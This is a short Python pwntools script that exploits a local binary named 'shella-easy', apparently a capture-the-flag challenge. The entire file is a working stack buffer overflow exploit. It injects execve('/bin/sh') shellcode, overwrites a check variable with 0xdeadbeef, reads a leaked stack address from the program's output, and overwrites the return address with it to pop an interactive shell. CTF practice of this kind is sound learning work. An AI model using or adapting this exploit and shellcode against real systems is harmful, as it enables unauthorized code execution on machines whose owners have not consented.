from pwn import *

pwn = process("./shella-easy")

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

buf = shellcode
buf += b'\x41' * (64 - len(buf))
buf += p32(0xdeadbeef)

pwn.recvuntil(b'have a ')
stack_addr = pwn.recvline()
stack_addr = stack_addr.decode()
stack_addr = stack_addr.strip(" with a side of fries thanks\n")
stack_addr = int(stack_addr,16)

buf += b'\x42' * 8
buf += p32(stack_addr)


pwn.sendline(buf)
pwn.interactive()
